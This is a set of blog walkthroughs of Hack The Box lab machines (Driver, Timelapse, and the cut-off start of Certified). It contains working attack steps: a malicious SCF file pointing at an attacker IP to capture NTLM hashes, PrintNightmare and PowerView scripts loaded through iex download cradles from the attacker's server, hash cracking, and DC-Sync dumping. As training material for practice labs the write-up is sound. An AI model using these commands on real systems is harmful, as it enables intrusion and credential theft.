        "title": "Driver HTB Walkthrough: SCF File Exploitation and PrintNightmare Privilege Escalation",
        "tags": ["Windows","HTB","Hack The Box","SCF File","PrintNightmare","CVE-2021-1675","Privilege Escalation","NTLM Hash Capture","Windows Security","Printer Exploitation",],
        "content": "Driver Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Driver How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in Walkthroughs/HTB/BlogEntriesMade/Driver/scans 🍣 main 📝 ×139🛤️ ×1 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:49:09 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 09:49 GMT Nmap scan report for 10.129.250.87 Host is up (0.038s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 5.34 seconds Initial thoughts: RPC Web SMB Comprehensive Scans: In depth scan TCP: sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in Walkthroughs/HTB/BlogEntriesMade/Driver/scans 🍣 main 📝 ×139🛤️ ×1 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:49:57 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 09:50 GMT Nmap scan report for 10.129.250.87 Host is up (0.067s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-11-11T16:53:11 |_ start_date: 2024-11-11T16:45:48 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 186.52 seconds Findings: It says above \u0026quot;Please enter password for admin\u0026quot; which means there is some sort of admin panel present I imagine. This is not part of a domain as it says it\u0026rsquo;s part of a WORKGROUP: 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Both are disabled: +Discoveries+: What is interesting is that it\u0026rsquo;s running SMBv1 and we have the windows version also Windows 10 Enterprise 10240 x64 RPC: +Cheatsheet+: I have an enumeration \u0026amp; attacking cheatsheet for RPC, available here:\nhttps://bloodstiller.com/cheatsheets/rpc-cheatsheet/#enumerating-rpc-using-rpcclient Null session via RPC:\nMuch like SMB you can also connect to RPC via null \u0026amp; guest sessions, let\u0026rsquo;s see if they are valid here: rpcclient -U \u0026quot;\u0026quot; $box rpcclient -U '%' $box Both fail. Web 80: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Website Overview: Immediately when I try and access the site I am greeted with a basic authentication panel. As we saw above it says \u0026quot;Please enter password for admin\u0026quot; I enter default creds of admin:admin and get access. We can see there is an email address at the bottom too, lets add this to our list: Enumerating Injection Points: The only viable injection point is the upload page. Where can upload a file that will be manually checked \u0026amp; tested.\nWe may be able to upload a reverse shell. We can see the website is running .php so we can use a php reverse web shell. I use the pentestmonkey one that is on revshells:\nI upload the shell and start my listener: I do not get a hit though: Directory Enumeration the web-server using ffuf: I Perform some directory busting to see if there are any interesting directories:\nffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic Nothing interesting from an unauthenticated session. I try dirbusting with an authenticated session by passing base64 encoded credentials:\nBase64 encode our credentials: echo -n 'admin:admin' | base64 Dirbust: ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic -H \u0026quot;Authorization: Basic YWRtaW46YWRtaW4=\u0026quot; Again nothing of note. 2. Foothold: Using an SCF File to get a users NTLM hash: As this host allows uploads it may be possible to upload a malicious .scf file to force them to authenticate back to our attack host and send us their NTLM hash.\nI save the below as a .scf file:\n[Shell] Command=2 IconFile=\\\\10.10.14.97\\share\\LasjetJet.ico [Taskbar] Command=ToggleDesktop +Note+: I name it @PrinterDriver.scf so it\u0026rsquo;s something similar what would be uploaded so it does not arouse suspicion \u0026amp; looks legitimate. Put an @ at the start of the name so it appears at the top and ensure it is executed as soon as the user accesses the share it is in. This way the user does not need to click on it and it will trigger. This type of attack is typically done with SMB shares. I start responder:\nsudo responder -wd -v -I tun0 I upload the .scf:\nI get a hit \u0026amp; get back the user tony\u0026rsquo;s NTLM hash:\nSCF (Shell Command File) Primer: Purpose: Originally designed for quick access to certain Windows system commands, like opening Windows Explorer or the Recycle Bin.\nFile Extension: .scf\nFormat: Plain text file with commands in a specific format, commonly referencing icon locations.\nCommon Fields:\n[Shell] – Header indicating it\u0026rsquo;s an SCF file. Command – Specifies the command or action to take, like opening Windows Explorer. IconFile – Points to an icon resource (e.g., file path or UNC path). Exploitability:\nSCF files can be exploited because Windows automatically renders icon files specified in SCF files. By pointing the IconFile field to a remote UNC path, an attacker can trigger Windows Explorer to initiate an SMB connection to the specified path, leaking NTLM hashes in the process. Mitigation Tips:\nDisabling SMBv1 and securing SMB authentication settings can help mitigate risks associated with SCF file exploitation. Recent versions of Windows Server (2019+) handle SCF files differently, limiting their exploitability. SCF Exploit Explained: SCF File Exploit: SCF (Shell Command File\u0026rsquo;s): Can be modified to point its icon file location to a specific UNC (Universal Naming Convention) path, typically an IP address. Result of manipulation: Windows Explorer automatically initiates an SMB (Server Message Block) session when accessing the folder with the modified .scf file. This action sends the victim\u0026rsquo;s NTLMv2 hash to our attack host. Exploitation Tools: Tools like Responder, Inveigh, or InveighZero can be used to poison and capture the NTLMv2 hashes sent by the victim. +Simplified Explanation+: By putting a malicious .scf file on the target that points to our host the victim will attempt to authenticate back to us and in doing so will send their NTLMv2 hash which we can capture +Note+: If the target system is Windows Server 2019 or newer, an LNK file must be used instead of an SCF file. Cracking Tony\u0026rsquo;s hash with hashcat: I crack it with hashcat: hashcat -m 5600 tony.hash /home/kali/Wordlists/rockyou.txt -O Verify they work: Enumerating Users with RPC: I connect using rpcclient and list the users:\nrpcclient -U 'tony' $box There are only 2 other users other than tony, Guest (which is disabled and Administrator) I check the description field for the Administrator user in-case there is a password in it etc:\nqueryuser 0x1f4 There isn\u0026rsquo;t :( Enumerating as Tony: I connect via evil winrm:\nevil-winrm -i $box -u $user -p $pass Grab the user flag:\nI check PowerShell history but nothing:\n(Get-PSReadLineOption).HistorySavePath Check my privs:\nwhoami /priv Nothing interesting. I Check the fw_up.php and index.php:\nI check both the website .php files in the web-root(wwwroot) but neither hold anything interesting. 3. Privilege Escalation: Discovering the host is vulnerable to PrintNightmare CVE-2021-1675: As the box is called driver and there have been various nods to printers I check if the it\u0026rsquo;s susceptible to PrintNightmare with netexec: netexec smb $box -u $user -p $pass -M printnightmare It is, lets attack. +Note+: I have a priv-esc checklist that I run through when I am working on machines and checking for PrintNightmare is one of these checks (I didn\u0026rsquo;t just magically stumbled upon the idea). However now we have a viable path forward. Adding an Admin User using PrintNightmare CVE-2021-1675: Get exploit:\nLets get the POC. wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1 Start python server:\npython3 -m http.server 9000 +Note+: I have this command aliased to pws Use download cradle to load into memory:\niex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1') +Deep Dive+: I have a deep dive into download cradles and how they work:\nhttps://bloodstiller.com/articles/understandingdownloadcradles/ Create new user \u0026amp; add them to the admins:\nInvoke-Nightmare -NewUser \u0026quot;bloodstiller\u0026quot; -NewPassword \u0026quot;bl00dst1ll3r!\u0026quot; -DriverName \u0026quot;PrintIt\u0026quot; Verify the user has been added:\nnet user bloodstiller They have been. Verify the creds work:\nGet flag:\nDump hashes with impacket-secretsdump:\nimpacket-secretsdump $domain/$user:$pass@$box Lessons Learned: What did I learn? It took me a long time to see you could upload an SCF so long as it was being accessed from a share/etc it would work. What silly mistakes did I make? Not too many, may be getting better, here\u0026rsquo;s hoping. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "content": "Timelapse Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Timelapse How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Timelapse/scans/nmap 🍣 main 3GiB/7GiB | 268kiB/1GiB with /usr/bin/zsh 🕙 22:16:09 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 22:16 GMT Nmap scan report for 10.129.227.113 Host is up (0.040s latency). Not shown: 991 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.41 seconds Initial thoughts: DNS Kerberos SMB LDAP RPC Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in content-org/Walkthroughs/HTB/BlogEntriesMade/Timelapse 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 22:22:24 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 06:14 GMT Stats: 0:02:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 77.90% done; ETC: 06:17 (0:00:35 remaining) Stats: 0:02:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 11.76% done; ETC: 06:18 (0:00:45 remaining) Nmap scan report for 10.129.123.90 Host is up (0.039s latency). Not shown: 65518 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-11 14:17:46Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_ssl-date: 2024-11-11T14:19:20+00:00; +8h00m00s from scanner time. | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after: 2022-10-25T14:25:29 | tls-alpn: |_ http/1.1 |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49695/tcp open msrpc Microsoft Windows RPC 49724/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-11-11T14:18:40 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 262.82 seconds LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 /home/kali/windowsTools/enumeration/ldapire.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in HTB/BlogEntriesMade/Timelapse/scans/ldap 🍣 main 3GiB/7GiB | 268kiB/1GiB with /usr/bin/zsh 🕙 22:17:33 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.227.113 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.227.113 with non-SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=timelapse,DC=htb CN=Configuration,DC=timelapse,DC=htb CN=Schema,CN=Configuration,DC=timelapse,DC=htb DC=DomainDnsZones,DC=timelapse,DC=htb DC=ForestDnsZones,DC=timelapse,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=timelapse,DC=htb The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;timelapse.htb\u0026quot; update_var machine \u0026quot;DC01\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host\u0026rsquo;s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt No hits Using netexec for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win: netexec ldap $box -u '' -p '' --asreproast asrep.txt netexec ldap $box -u guest -p '' --asreproast asrep.txt Neither get hits. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares\nWe have read access to shares as the guest user. netexec smb $box -u '' -p '' --shares\nNull session disabled. Enumerating Users with Impacket-lookupsid: We can use impacket-lookupsid to enumerate users on the domain: impacket-lookupsid $domain/guest@$machine.$domain -domain-sids impacket-lookupsid guest@$box -domain-sids -no-pass +Note+: As we are using the \u0026ldquo;Guest\u0026rdquo; account we can just hit enter for a blank password Interesting users, I will add them to my user list. Using smbclient to enumerate shares: smbclient -U 'guest' \u0026quot;\\\\\\\\$box\\\\shares\u0026quot; Finding LAPS related documentation on in the HelpDesk share: Searching the helpdesk share shows alot of LAPS related information:\nI download all the files:\nI check the documentation but it\u0026rsquo;s all official documentation by microsoft. +Note+: This does not directly tell us anything however we can most likely infer that LAPS is in use on this box somewhere. Local Administrator Password Solution (LAPS) Primer: LAPS is a Microsoft tool designed to manage and secure local administrator passwords on domain-joined machines by generating unique, random passwords.\nPurpose: Prevents lateral movement and credential theft across systems by ensuring each machine has a unique local administrator password.\nHow it Works:\nPasswords are stored securely in Active Directory (AD) and tied to individual machines. Passwords are updated regularly based on Group Policy settings. Only authorized users/groups have access to these stored passwords. Key Features:\nAutomatic Password Rotation: Random passwords are generated and regularly updated, reducing exposure from old or reused passwords. Secure Storage: Passwords are stored in AD as an attribute of the computer object, protected by AD permissions. Access Control: Administrators can control who can view the passwords, ensuring limited and audited access. Benefits:\nMitigates Lateral Movement: Reduces the risk of a compromised local admin account being used to move laterally across systems. Enhanced Security: Unique passwords for each device eliminate risks associated with shared or default passwords. Simplicity and Automation: Password rotation and management are automated, decreasing administrative overhead. Common Use Cases:\nEnforcing strong local admin credentials across enterprise environments. Reducing credential reuse and enhancing compliance for audits and regulatory standards. Limitations:\nOnly works on domain-joined Windows machines. Requires Active Directory schema modification, which may need approval from IT governance. 2. Foothold: Finding a backup in the Dev share: There is a file called winrm_backup.zip in the Dev share:\nI download it:\nI try and open the file but it\u0026rsquo;s password protected:\nWhat is interesting is, is the fact that there is a .pfx cert in here, which should allow us to authenticate. PFX Certificates in Windows: A Primer What\u0026rsquo;s Inside a PFX File:\nA PFX file (also known as PKCS#12) is like a secure digital envelope containing two essential pieces:\nA public key that others use to encrypt data or verify your identity A private key that only you have, used to decrypt data or prove it\u0026rsquo;s really you Why They Matter in Windows:\nIn the Windows world, PFX certificates handle several crucial security tasks: Securing web traffic through HTTPS Protecting Remote Desktop connections Enabling secure email in Outlook Verifying the authenticity of code and scripts Supporting Single Sign-On across applications How Windows Handles PFX Files:\nWindows stores these certificates in its Certificate Store, which you can think of as a secure vault for your digital credentials. The system protects the private keys and manages access to them, while making the public certificates available when needed.\nWorking with certificates in Windows is straightforward - the system provides built-in tools like the Certificate Import Wizard and Certificate Manager (certlm.msc) to handle PFX files. Once imported, Windows takes care of the heavy lifting of using these certificates for authentication and encryption.\nImportant Considerations: A few key points to keep in mind about PFX certificates in Windows: They\u0026rsquo;re usually password-protected for additional security Windows can store them at either the user or machine level The system handles key storage security automatically Not all applications can use PFX format directly Managing multiple certificates across systems requires planning Cracking the encrypted zip file using zip2john \u0026amp; john: As the zip file is password protected we can use zip2john to generate a hash we can then crack:\nzip2john winrm_backup.zip \u0026gt;\u0026gt; winrm.hash Cracking the hash:\njohn winrm.hash --wordlist=/home/kali/Wordlists/rockyou.txt It cracks Extracting the .pfx:\nIt works Attempting to extract the private keys from the .pfx: Initially I try and extract the certificate \u0026amp; key from the pfx but the password is not accepted: openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legaccy_dev_auth.pem -nodes No dice. Cracking the .pfx using pfx2john \u0026amp; john: Like the zip before we can crack this pfx file to extract the password.\nGenerate a hash using pfx2john\npfx2john legacyy_dev_auth.pfx \u0026gt;\u0026gt; pfx.hash Crack:\njohn pfx.hash --wordlist=/home/kali/Wordlists/rockyou.txt Extracting the private key \u0026amp; certificate with openssl from a .pfx: Extract the private key:\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legaccy_dev_auth-priv-key.pem -nodes Extract the certificate:\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legaccy_dev_auth-cert.pem -nodes Connecting with evil-winrm to the host using certificates: As we have extracted both the key and cert from the .pfx we can now authenticate with evil-winrm\nevil-winrm -i $box -c legaccy_dev_auth-cert.pem -k legaccy_dev_auth-priv-key.pem -S +Note+: See how we used S for ssl as we are using cert based authentication. Grab our user flag:\nCheck users on the host:\n3. Privilege Escalation: General Enumeration: Check group membership: I check what groups we are part of: whoami /groups Check privileges: Check our privs: whoami /priv Checking PowerShell history: As our user is part of the legacy devs there may be some interesting information in their PowerShell history.\nCheck the file exists: (Get-PSReadLineOption).HistorySavePath It does, lets download. I go to download it but it fails:\nI check the folder and can see the name of the file is actually ConsoleHost_history.txt\nI download it:\nFinding clear text credentials in the PowerShell history file: Looking through the file I find the clear text creds for the svc_deploy service account:\nI test the creds \u0026amp; they are valid:\nPerforming a bloodhound collection: Now that we have some credentials we can perform a bloodhound collection. bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box Finding out svc_deploy has ReadLAPSPassword privileges over the DC: Looking at bloodhound we can see that we are part of the LAPS_READERS groups which has ReadLAPSPassword privileges over the DC01, so we can read the machines password. Retrieving DC01 LAPS Password with PowerView via download cradle: To avoid AMSI I decide to use PowerView.ps1 with a download cradle. This means I can use a download cradle to load the script directly into memory without needing to download anything onto the host itself.\n+Note+: I know there are linux tool to extract the LAPS password however I wanted to use this methodology as an exercise. I stand up my python server:\npython3 -m http.server 9000 On the target from an evil-winrm admin shell I use a download cradle to load the sript into memory: iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/PowerView.ps1') Let\u0026rsquo;s create a secure string, using svc_deploy\u0026rsquo;s creds:\n$SecPassword = ConvertTo-SecureString \u0026#39;[svc_password]\u0026#39; -AsPlainText -Force Create Credential Object for Authentication:\n$Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;timelapse.htb\\svc_deploy\u0026#39;, $SecPassword) Retrieve LAPS Password Using the Service Account:\nGet-DomainObject DC01 -Credential $Cred -Properties \u0026#34;ms-mcs-AdmPwd\u0026#34;,name +Note+: The LAPS password is stored in the \u0026ldquo;ms-mcs-AdmPwd\u0026rdquo; attribute. Now that we have the LAPS password we can authenticate as the administrator:\nnetexec smb $box -u $user -p $pass --shares Grabbing our flag: impacket-psexec $domain/$user@$box -hashes :$hash There was no flag on the Administrators desktop. Looking through the box though there are other users; as we have enumerated all other users desktop let\u0026rsquo;s check out TRX. Flag found: +Note+: I had to use psexec as winrm stopped working (and continued to not work even after box resets) I had to actually perform this after the DC-Sync to retrieve the administrator hash as I could not use evil-winrm and the LAPS password to connect. I have since checked some known walktrhoughs and you should be able to authenticate so maybe I just got unlucky. So if you encounter the same issue, jump to my persistence section to view how to DC-Sync and then use the above approach. 4. Persistence: Dumping NTDS.dit/DC-SYNC attack: Perform DC-Sync attack using netexec:\nnetexec smb $box -u $user -p $pass -M ntdsutil Extract all hashes from netexec\nfor file in /home/kali/.nxc/logs/*.ntds; do cat \u0026quot;$file\u0026quot; | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\\n'; done Lessons Learned: What did I learn? I learned alot about extracting credentials from .pfx files. That was fun. I learned that even if the box is being finnicky there will be a way to work around it. What silly mistakes did I make? Not terrible this time. Nothing to write home about. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "content": "Certified Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Certified How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Assumed Breach Box: This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials. This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today. +Note+: Even with assumed credentials, I\u0026rsquo;ll still conduct my standard enumeration process as if I don\u0026rsquo;t have them. This ensures I don\u0026rsquo;t overlook any findings just because access is available. Comprehensive documentation of all discoveries remains essential. NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Certified/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:59:52 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 07:59 GMT Nmap scan report for 10.129.107.1 Host is up (0.043s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.46 seconds Initial thoughts: DNS, Kerberos, SMB, Ldap \u0026amp; RPC all good means of enumeration. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Certified/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 15:06:16 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 15:06 GMT Nmap scan report for certified.htb (10.129.107.1) Host is up (0.039s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-06 15:08:29Z) 135/tcp open msrpc 